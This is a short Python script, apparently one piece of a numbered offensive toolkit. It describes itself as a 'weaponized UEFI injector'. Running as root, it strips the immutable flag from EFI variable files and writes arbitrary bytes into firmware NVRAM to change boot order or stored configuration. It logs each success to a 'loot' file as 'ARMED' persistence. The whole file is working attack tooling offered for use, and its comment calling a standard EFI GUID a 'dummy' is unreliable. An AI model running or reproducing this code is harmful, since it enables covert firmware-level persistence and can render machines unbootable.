import os
import sys
import subprocess

def inject_efi_variable(var_name, data_hex):
    """
    Weaponized UEFI Injector: Writes custom data to efivarfs 
    to manipulate the system boot order or stored firmware configs.
    """
    if os.geteuid() != 0:
        print("[-] ROOT REQUIRED: UEFI variable access requires UID 0.")
        sys.exit(1)

    # Check if efivarfs is mounted
    efivars_path = "/sys/firmware/efi/efivars"
    if not os.path.exists(efivars_path):
        print("[-] ERROR: efivarfs not found. System may be BIOS-based or restricted.")
        return

    print(f"[*] Targeting UEFI Variable: {var_name}")

    # Standard EFI Variable Header (Attributes: Non-volatile, Boot-service, Runtime)
    # 07 00 00 00 -> EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS
    header = "07000000"
    full_payload = header + data_hex
    
    # Path format: Name-GUID (Using a dummy GUID for Chimera persistence)
    target_path = f"{efivars_path}/{var_name}-8be4df61-93ca-11d2-aa0d-00e098032b8c"

    try:
        # We must remove the 'immutable' flag often set on EFI vars for protection
        if os.path.exists(target_path):
            subprocess.run(["chattr", "-i", target_path], check=True)

        # Write the hex data to the variable
        with open(target_path, "wb") as f:
            f.write(bytes.fromhex(full_payload))
        
        print(f"[!!!] SUCCESS: UEFI Variable '{var_name}' injected into NVRAM.")
        
        # Log to project loot
        loot_path = "../../../loot/persistence_history.log"
        with open(loot_path, "a") as log:
            log.write(f"Type: UEFI_INJECT | Variable: {var_name} | Status: ARMED\n")

    except Exception as e:
        print(f"[-] UEFI Injection Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 177_efi_inject <var_name> <data_hex>")
        sys.exit(1)
    
    # Example: Injecting a 4-byte 'Chimera' marker
    # 177_efi_inject "ChimeraBoot" "4348494d"
    v_name = sys.argv[1]
    d_hex = sys.argv[2] if len(sys.argv) > 2 else "4348494d"
    inject_efi_variable(v_name, d_hex)
